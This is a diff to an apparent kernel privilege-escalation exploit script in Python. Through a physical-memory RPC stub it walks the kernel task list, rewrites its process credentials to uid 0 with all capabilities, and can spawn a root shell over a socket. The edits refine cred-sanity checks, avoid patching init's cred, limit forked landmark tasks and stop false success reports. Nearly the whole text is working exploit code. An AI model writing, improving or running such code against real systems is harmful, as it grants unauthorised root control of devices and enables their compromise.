@@ -199,11 +199,28 @@ def walk_back(rpc, init_phys, init_virt, off, max_hops=2500, verbose=False):
 
 def patch_full(rpc, cred_phys):
     """uid/gid -> 0 and permitted/effective caps -> all (CAP_DAC_OVERRIDE,
-    CAP_MAC_OVERRIDE, CAP_SYS_ADMIN, ...).  Bounding set is already full."""
+    CAP_MAC_OVERRIDE, CAP_SYS_ADMIN, ...).  Bounding set is already full.
+
+    Caps are written ONLY after an ids write that started from uid 5001.  A cred
+    that already reads 0 is reported and left completely untouched: a stale task
+    pointer can land on init's cred, and v39 briefly wrote caps to it (review
+    2026-10-26).
+    """
     if cred_phys >= 0xC0000000:
         cred_phys = PHYS(cred_phys)
-    ok = T.patch_cred(rpc, cred_phys)
-    if not ok:
+    try:
+        uid = rpc.read_u32(cred_phys + 4)
+    except Exception:
+        return False
+    if uid == 0:
+        print(f"[*] cred {T.hexs(cred_phys)} already uid 0 - caps untouched",
+              flush=True)
+        return False
+    if uid != 5001:
+        print(f"[-] skip {T.hexs(cred_phys)}: uid {uid} is not ours (5001)",
+              flush=True)
+        return False
+    if not T.patch_ids(rpc, cred_phys):
         return False
     for off in (O_CAP_PERMITTED, O_CAP_EFFECTIVE):
         for k, val in ((0, CAP_FULL_LO), (4, CAP_FULL_HI)):
@@ -263,16 +280,36 @@ def root(rpc, do_exec=False):
         real = rpc.read_u32(tag_phys - 12)
         print(f"[+] found PHYSRPC1 at {T.hexs(task)} after {hops} prev hops; "
               f"cred={T.hexs(cred)} real_cred={T.hexs(real)}", flush=True)
-        ok = True
+        wrote = already = False
         for c in {cred, real}:
-            if T._kernel_ptr(c):
-                ok = patch_ours(rpc, c) and ok
-        if ok:
+            if not T._kernel_ptr(c):
+                continue
+            try:
+                uid = rpc.read_u32(PHYS(c) + 4)
+            except Exception:
+                uid = None
+            if uid == 0:
+                already = True
+                continue
+            if uid != 5001:
+                continue
+            if patch_full(rpc, c):
+                wrote = True
+        if wrote:
             print("[+] uid patch applied: this process is now uid 0", flush=True)
             if do_exec:
                 print("[*] sending EXEC (root shell on the socket)", flush=True)
                 rpc.exec_shell()
-        return ok
+            return True
+        if already:
+            # Same rule as root_via_fork: a uid-0 cred is not proof that THIS
+            # stub is rooted (a stale task pointer can reach init's cred), so do
+            # not claim success and do not send EXEC.
+            print("[!] only uid-0 creds were found on this walk - that is not "
+                  "proof this stub is rooted (a stale task can point at init's "
+                  "cred); not sending EXEC. Use kernel_root.py --fork or reload "
+                  "the page.", flush=True)
+            return False
     print("[-] PHYSRPC1 not found in any candidate list", flush=True)
     return False
 
@@ -333,29 +370,6 @@ def _find_fork_task(rpc, init_phys, init_virt, off, attempts=10, hops=40,
     return None
 
 
-def _find_tag_near_tail(rpc, init_phys, init_virt, off, tag, hops=200):
-    """Walk init.tasks.prev (the newest tasks) looking for a comm tag."""
-    try:
-        cur = rpc.read_u32(init_phys + off + 4)
-    except Exception:
-        return None
-    for _ in range(hops):
-        if not T._kernel_ptr(cur):
-            break
-        task = (cur - off) & 0xFFFFFFFF
-        try:
-            comm = _comm_at(rpc, task)
-        except Exception:
-            break
-        if comm.startswith(tag):
-            return task
-        try:
-            cur = rpc.read_u32(PHYS(cur) + 4)
-        except Exception:
-            break
-    return None
-
-
 def _find_tags_near_tail(rpc, init_phys, init_virt, off, tag, hops=400):
     """Every task whose comm starts with `tag`, walking init.tasks.prev.
 
@@ -393,7 +407,12 @@ def _find_tags_near_tail(rpc, init_phys, init_virt, off, tag, hops=400):
 def _sane_cred(rpc, cred):
     """A real cred lives in the kernel direct map and has a small refcount and
     small uid/gid values.  Anything else (vmalloc pointer, ASCII data, stale
-    task field) must never be patched."""
+    task field) must never be patched.
+
+    The bounds mirror the payload's SaneCred exactly (v39): every id below
+    0x1000000, and the uid itself below 0x100000.  The old `< 0x100000` test on
+    the gid as well rejected a cred the payload would have accepted.
+    """
     if not (0xC0000000 <= cred <= 0xFFFFFFFF) or (cred & 3):
         return False
     try:
@@ -406,7 +425,7 @@ def _sane_cred(rpc, cred):
         return False
     if any(v > 0x1000000 for v in ids):
         return False
-    return ids[0] < 0x100000 and ids[1] < 0x100000
+    return ids[0] < 0x100000
 
 
 def root_via_fork(rpc, do_exec=False):
@@ -422,33 +441,44 @@ def root_via_fork(rpc, do_exec=False):
         return False
     init_phys = PHYS(init_virt)
 
-    for attempt in range(6):
-        # Refresh the orphan set before every fork: a failed attempt leaves a
-        # paused PHYRFORK child behind, and picking that one makes the parent
-        # scan fail ("no PHYSRPC1 task found").
+    # Fork exactly ONE landmark.  A fork that returns a pid HAS created a paused
+    # PHYRFORK: if the walk cannot find it, do not fork again - the first one
+    # stays behind and crowds the tail (trap 8).  A fork that returns no pid
+    # created nothing, so retrying that is safe.
+    child = None
+    for _ in range(2):
         pre = _tagged_near_tail(rpc, init_phys, init_virt, 0x23C, b"PHYRFORK", 400)
         pid = -1
-        for _ in range(2):
-            try:
-                pid = _fork_pid(rpc)
-            except Exception as exc:
-                print(f"[!] fork failed: {exc}", flush=True)
-                pid = -1
-            if pid > 0:
-                break
-            time.sleep(0.2)
-        print(f"[*] attempt {attempt + 1}: fork -> {pid} "
-              f"(known orphans: {len(pre)})", flush=True)
+        try:
+            pid = _fork_pid(rpc)
+        except Exception as exc:
+            print(f"[!] fork failed: {exc}", flush=True)
+            pid = -1
+        print(f"[*] fork -> {pid} (known orphans: {len(pre)})", flush=True)
         if pid <= 0:
+            time.sleep(0.2)      # no child was created; a retry adds nothing
             continue
+        # _find_fork_task re-walks with its own retries (~1 s); one call is the
+        # whole budget for this landmark.
         hit = _find_fork_task(rpc, init_phys, init_virt, 0x23C, hops=200,
                               exclude=pre)
-        if hit is None:
-            print("[-] PHYRFORK child not found near the tail", flush=True)
-            time.sleep(0.2)
-            continue
-        task, _ = hit
-        print(f"[+] PHYRFORK child at {T.hexs(task)}", flush=True)
+        if hit is not None:
+            child, _ = hit
+            print(f"[+] PHYRFORK child at {T.hexs(child)}", flush=True)
+        else:
+            print(f"[-] PHYRFORK pid {pid} was created but not found in the "
+                  f"walk; not forking a second landmark - reload the page",
+                  flush=True)
+        break
+    if child is None:
+        print("[-] no usable landmark - reload the page for a fresh stub",
+              flush=True)
+        return False
+
+    for attempt in range(6):
+        print(f"[*] attempt {attempt + 1}: scanning around child "
+              f"{T.hexs(child)}", flush=True)
+        task = child
 
         # Primary: find our own PHYSRPC1 thread by walking the tail; its cred
         # is the one getuid() reads, and it is validated before patching.
@@ -510,11 +540,14 @@ def root_via_fork(rpc, do_exec=False):
                 rpc.exec_shell()
             return True
         if already:
-            print("[+] stub cred already uid 0 - nothing written", flush=True)
-            if do_exec:
-                print("[*] sending EXEC", flush=True)
-                rpc.exec_shell()
-            return True
+            # NOT proof that this stub is rooted: a freed PHYSRPC1 task can sit
+            # nearer the tail and point at init's cred (uid 0), while the live
+            # uid-5001 stub was not in the walked range.  Returning True here
+            # used to send EXEC and hide that (review 2026-10-26).
+            print("[!] only uid-0 creds were found among the tags - that is not "
+                  "proof this stub is rooted (a stale task can point at init's "
+                  "cred); not sending EXEC. Reload the page and retry.", flush=True)
+            return False
         time.sleep(0.2)
     print("[-] no sane cred found after retries", flush=True)
     return False
